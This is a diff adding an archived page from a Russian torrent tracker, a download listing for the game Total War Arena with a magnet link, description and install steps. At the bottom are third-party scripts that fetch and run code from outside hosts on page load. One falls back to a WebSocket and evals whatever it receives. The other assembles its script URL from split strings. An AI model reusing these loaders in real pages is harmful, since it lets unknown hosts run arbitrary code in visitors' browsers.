@@ -1,0 +1,358 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Total War Arena [0.1.24128.1365518.566] (2018) PC | Online-only</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Total War Arena [0.1.24128.1365518.566] (2018) PC | Online-only</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:fa4e7ce55240e468fa1b80b1fb26cdbe448e90fa&amp;dn=rutor.info_Total+War+Arena+%5B0.1.24128.1365518.566%5D+%282018%29+PC+%7C+Online-only&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630479"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630479"><img src="http://s.rutor.info/t/down.png"> Скачать Total_War_Arena_0.1.24128.1365518.566.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><center><img src="https://a.radikal.ru/a31/1803/36/af2face206bd.jpg" /></center><br />
+<br />
+<img src="https://c.radikal.ru/c27/1803/e4/befba32d224e.jpg" style="float:right;" /><br />
+<br />
+<b><font size="4">Информация</font></b><br />
+<b>Год выпуска</b>: 2018<br />
+<b>Жанр</b>:  <a href="/tag/8/Action" target="_blank">Action</a>, <a href="/tag/8/Strategy" target="_blank">Strategy</a>, <a href="/tag/8/Tactic" target="_blank">Tactic</a>, <a href="/tag/8/MMO" target="_blank">MMO</a><br />
+<b>Разработчик</b>: Creative Assembly<br />
+<b>Издательство в России</b>: Wargaming Alliance<br />
+<b>Версия</b>: 0.1.24128.1365518.566<br />
+<b>Тип издания</b>: Лицензия<br />
+<b>Язык интерфейса</b>: Русский<br />
+<b>Язык озвучки</b>: Русский<br />
+<b>Таблетка</b>: Не требуется<br />
+<br />
+<b><font size="4">Системные требования</font></b><br />
+<b>Операционная система:</b> Windows 7, Windows 8, Windows 10<br />
+<b>Процессор:</b> Intel Core i3-550 или AMD Phenom II x4 945<br />
+<b>Оперативная память:</b> 2 Гб<br />
+<b>Видеокарта:</b> Nvidia GeForce GTS 450 или AMD Radeon HD 5750<br />
+<b>Звуковая карта:</b> Cовместимая с DirectX 9.0c<br />
+<b>Свободное место на жестком диске:</b> 8 Гб<br />
+<br />
+<b><font size="4">Описание</font></b><br />
+<b>Total War: ARENA</b> — это бесплатная многопользовательская командная онлайн-стратегия, в которой игроки могут попробовать себя в роли легендарных полководцев и преумножить их бессмертную славу. Вобрав в себя все лучшее, чем славится вселенная Total War, «Арена» переносит масштабные сражения античности в онлайн, где интересно будет всем — от преданных поклонников первых игр серии до тех, кто только знакомится с «Тотальными войнами».<br />
+В каждом сражении игрок берет под свое командование три отряда в несколько сотен воинов и ведет ожесточенные бои плечом к плечу с другими полководцами в режиме 10 на 10. Продуманный игровой процесс позволяет прокачивать новые навыки, способности, тактики и вооружение, шаг за шагом продвигаясь к вершине славы и признания. Благодаря исторически достоверному и детально проработанному геймплею, Total War: ARENA позволяет игрокам встать в один ряд с величайшими полководцами античности.<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Установка</div><div class="hidebody"></div><textarea class="hidearea"><br />
+Вариант 1. Если у вас не установлен Wargaming Game Center. <br />
+1. Запустить ехе-файл. Установить следуя инструкции. <br />
+2. После установки в открывшемся окне создать аккаунт Wargaming и подтвердить регистрацию на почте. <br />
+3. Кликнуть на рабочем столе на ярлык, после чего установить Wargaming Game Center. В меню геймцентра выбрать Total War Arena и указать директорию, куда вы установили игру. Нажать играть, ввести логин и пароль, после чего можно приступать к игре. <br />
+<br />
+Вариант 2. Если у вас установлен Wargaming Game Center. <br />
+1. Запустить ехе-файл. Установить следуя инструкции. <br />
+2. После установки в открывшемся окне создать аккаунт Wargaming и подтвердить регистрацию на почте. <br />
+3. Запустить Wargaming Game Center. В меню геймцентра выбрать Total War Arena и указать директорию, куда вы установили игру. Нажать играть, ввести логин и пароль, после чего можно приступать к игре. <br />
+</textarea></div><br />
+<a href="https://c.radikal.ru/c33/1803/35/7cd9813b34ac.png" target="_blank"><img src="https://c.radikal.ru/c33/1803/35/7cd9813b34act.jpg" /></a> <a href="https://b.radikal.ru/b38/1803/4c/52a7a1d2ffe8.png" target="_blank"><img src="https://b.radikal.ru/b38/1803/4c/52a7a1d2ffe8t.jpg" /></a> <a href="https://a.radikal.ru/a37/1803/ac/d15a580d7088.jpg" target="_blank"><img src="https://a.radikal.ru/a37/1803/ac/d15a580d7088t.jpg" /></a> <a href="https://a.radikal.ru/a43/1803/51/4886d950e1d8.png" target="_blank"><img src="https://a.radikal.ru/a43/1803/51/4886d950e1d8t.jpg" /></a> <a href="https://d.radikal.ru/d23/1803/55/71cb90c0c5f0.png" target="_blank"><img src="https://d.radikal.ru/d23/1803/55/71cb90c0c5f0t.jpg" /></a> <br />
+<a href="https://c.radikal.ru/c26/1803/a0/d6a7bf43e7f3.jpg" target="_blank"><img src="https://c.radikal.ru/c26/1803/a0/d6a7bf43e7f3t.jpg" /></a> <a href="https://d.radikal.ru/d12/1803/69/a854b0c7b64c.png" target="_blank"><img src="https://d.radikal.ru/d12/1803/69/a854b0c7b64ct.jpg" /></a> <a href="https://c.radikal.ru/c05/1803/45/3b7102c39790.jpg" target="_blank"><img src="https://c.radikal.ru/c05/1803/45/3b7102c39790t.jpg" /></a> <a href="https://a.radikal.ru/a08/1803/01/51ed66bf74e0.jpg" target="_blank"><img src="https://a.radikal.ru/a08/1803/01/51ed66bf74e0t.jpg" /></a> <a href="https://c.radikal.ru/c11/1803/d8/6223411d1725.jpg" target="_blank"><img src="https://c.radikal.ru/c11/1803/d8/6223411d1725t.jpg" /></a></td></tr>
+
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>9</td></tr>
+<tr><td class="header">Качают</td><td>8</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (18 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 12:57:30  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>8.21&nbsp;GB  (8811922714 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630479);">закладки</span></td>
+</tr>
+
+
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630479.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (6)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630479">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630479);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630479);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630479">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
